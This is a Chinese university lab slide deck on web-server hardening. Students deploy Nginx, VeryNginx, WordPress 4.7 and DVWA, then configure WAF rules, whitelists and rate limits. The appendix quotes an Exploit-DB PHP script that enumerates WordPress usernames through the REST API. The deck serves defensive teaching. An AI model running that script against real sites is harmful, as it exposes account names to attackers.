---
title: "Linux系统与网络管理"
author: 黄玮
output: revealjs::revealjs_presentation
---

# 第五章：Web服务器（实验）

---

## 软件环境建议

* [Nginx](http://nginx.org/)
* [VeryNginx](https://github.com/alexazhou/VeryNginx)
    * 也可以使用其他 `WAF` 或 `API Gateway` 之类的解决方案代替
* [Wordpress](https://wordpress.org/)
    * [WordPress 4.7](https://wordpress.org/wordpress-4.7.zip) | [备用下载地址](https://github.com/WordPress/WordPress/archive/4.7.zip)
* [Damn Vulnerable Web Application (DVWA)](http://www.dvwa.co.uk/)

# 实验检查点

---

## 基本要求

* 在一台主机（虚拟机）上同时配置[Nginx](http://nginx.org/)和[VeryNginx](https://github.com/alexazhou/VeryNginx)
    * VeryNginx作为本次实验的Web App的反向代理服务器和WAF
    * PHP-FPM进程的反向代理配置在nginx服务器上，VeryNginx服务器不直接配置Web站点服务
* 使用[Wordpress](https://wordpress.org/)搭建的站点对外提供访问的地址为： http://wp.sec.cuc.edu.cn 
* 使用[Damn Vulnerable Web Application (DVWA)](http://www.dvwa.co.uk/)搭建的站点对外提供访问的地址为： http://dvwa.sec.cuc.edu.cn

---

## 安全加固要求

* 使用IP地址方式均无法访问上述任意站点，并向访客展示自定义的**友好错误提示信息页面-1**
* [Damn Vulnerable Web Application (DVWA)](http://www.dvwa.co.uk/)只允许白名单上的访客来源IP，其他来源的IP访问均向访客展示自定义的**友好错误提示信息页面-2**
* 在不升级Wordpress版本的情况下，通过定制[VeryNginx](https://github.com/alexazhou/VeryNginx)的访问控制策略规则，**热**修复[WordPress \< 4.7.1 - Username Enumeration](https://www.exploit-db.com/exploits/41497/)
* 通过配置[VeryNginx](https://github.com/alexazhou/VeryNginx)的Filter规则实现对[Damn Vulnerable Web Application (DVWA)](http://www.dvwa.co.uk/)的SQL注入实验在低安全等级条件下进行防护

---

## VeryNginx配置要求

* [VeryNginx](https://github.com/alexazhou/VeryNginx)的Web管理页面仅允许白名单上的访客来源IP，其他来源的IP访问均向访客展示自定义的**友好错误提示信息页面-3**
* 通过定制[VeryNginx](https://github.com/alexazhou/VeryNginx)的访问控制策略规则实现：
    * 限制DVWA站点的单IP访问速率为每秒请求数 < 50
    * 限制Wordpress站点的单IP访问速率为每秒请求数 < 20
    * 超过访问频率限制的请求直接返回自定义**错误提示信息页面-4**
    * 禁止curl访问

# 附录

---

[WordPress \< 4.7.1 - Username Enumeration](https://www.exploit-db.com/exploits/41497/)

```php
#!usr/bin/php
<?php
 
#Author: Mateus a.k.a Dctor
#fb: fb.com/hatbashbr/
#E-mail: dctoralves@protonmail.ch
#Site: https://mateuslino.tk 
header ('Content-type: text/html; charset=UTF-8');
 
 
$url= "http://localhost/";
$payload="wp-json/wp/v2/users/";
$urli = file_get_contents($url.$payload);
$json = json_decode($urli, true);
if($json){
    echo "*-----------------------------*\n";
foreach($json as $users){
    echo "[*] ID :  |" .$users['id']     ."|\n";
    echo "[*] Name: |" .$users['name']   ."|\n";
    echo "[*] User :|" .$users['slug']   ."|\n";
    echo "\n";
}echo "*-----------------------------*";} 
else{echo "[*] No user";}
```



